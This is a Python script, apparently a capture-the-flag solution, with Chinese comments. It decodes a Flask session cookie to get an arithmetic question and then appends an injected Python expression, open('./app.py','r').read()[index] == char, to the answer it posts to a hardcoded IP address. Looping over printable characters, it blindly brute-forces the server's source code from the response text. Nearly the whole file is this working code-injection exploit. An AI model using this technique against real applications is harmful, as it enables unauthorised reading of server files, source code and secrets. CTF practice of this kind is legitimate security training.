import requests
import base64
import json
from html.parser import HTMLParser
from html.entities import name2codepoint
import string
import time
import zlib

# 继承HTMLParser
class MyHTMLParser(HTMLParser):

    # def handle_starttag(self, tag, attrs):
    #     print('<%s>' % tag)
    #
    # def handle_endtag(self, tag):
    #     print('</%s>' % tag)
    #
    # def handle_startendtag(self, tag, attrs):
    #     print('<%s/>' % tag)


    def handle_data(self, data):
        # html标签内的data
        # print(data)
        if data == 'Congratulations':
            # 猜测成功，网页会返回 Congratulations
            # print('ok')
            print(data + "===========================================================================")
            # exit()

    # def handle_comment(self, data):
    #     print('<!--', data, '-->')
    #
    # def handle_entityref(self, name):
    #     print('&%s;' % name)
    #
    # def handle_charref(self, name):
    #     print('&#%s;' % name)

def getCookie(url, data=None, index=None):
    """

    :param url: 请求的url
    :param data: post的数据
    :param index: 爆破的Flag的第几位字符
    :return:
    """
    Hostreferer = {
        # 'Host':'***',
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36'
    }
    # 创建session
    session_p = requests.Session()
    # 使用session提交请求
    html = session_p.get(url, headers=Hostreferer, verify=False)
    # urllib或requests在打开https站点是会验证证书。 简单的处理办法是在get方法中加入verify参数，并设为False
    # 获取cookie:
    one_cookie = None
    if html.status_code == 200:
        # print(html.cookies)
        for cookie in html.cookies:
            # print(cookie)
            # print(cookie.value)
            one_cookie = cookie.value
    """
    压缩后的seeeion
    .eJyrViosTS0uyczPU7JS0tA1MTM1szDT1NbQNbM0MjIyALOMDIwhYuYmRpaWFiCWiaUFUFTTVqkWABdPDsQ.X13kkw.AtZ561gdqEyAWWjWd71dvpWhgJc
    """
    lst_cookie_value = one_cookie.split('.')
    if len(lst_cookie_value) == 4:
        str_question = zlib.decompress(base64.urlsafe_b64decode(lst_cookie_value[1] + '===')).decode("ascii")
    else:
        str_question = base64.urlsafe_b64decode(lst_cookie_value[0] + '===').decode("ascii")
    json_question = json.loads(str_question)
    # print(json_question['question'])  # (-150821)+(-757374)+(-532211)+(624169)+(586387)
    # print(type(json_question['question']))  # str

    # 构造请求参数
    post_data = dict()
    post_data['input'] = json_question['question'][:-1] + f"-1+(open('./app.py', 'r').read()[{index}] == str('{data}'))"
    # print(f"提交的数据：{post_data['input']}")
    html = session_p.post(url, headers=Hostreferer, verify=False, data=post_data)
    # print(html.text)
    return html.text


parser = MyHTMLParser()
print(len(string.printable))
# parser.feed(getCookie('http://183.129.189.60:10061', index=5, data=' '))
for j in range(5):
    for i in string.printable:
        # time.sleep(1)
        print(i)
        parser.feed(getCookie('http://183.129.189.60:10061', data=i, index=j))
